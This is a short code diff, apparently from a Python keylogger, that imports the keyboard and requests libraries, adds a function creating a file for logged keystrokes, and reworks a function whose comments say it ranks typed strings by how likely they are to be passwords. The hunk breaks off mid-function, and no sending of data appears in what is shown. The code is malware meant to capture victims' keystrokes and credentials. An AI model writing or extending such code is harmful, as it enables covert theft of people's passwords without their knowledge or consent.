@@ -1,13 +1,15 @@
 import keyboard
 import os
 import re
-import requests
 from typing import IO
+import requests
+import uuid
 
-def open_logged_keys_file(path):
-    return os.open(path, "a")
+def create_logged_keys_file(path:str, file_name:str)->IO:
+    file_path = os.path.join(path, file_name)
+    return os.open(file_path, "a")
 
-def word_priority_predictor(word: str)->int:
+def word_priority_predictor(word:str)->int:
     #Matches any string that is 8 characters or more, as most passwords usually are
     length_regex = re.compile(r'^.{8,}$')
     #Matches any string that includes a mix of uppercase and lowercase letters, numbers, and special characters, which is usually a password requirement
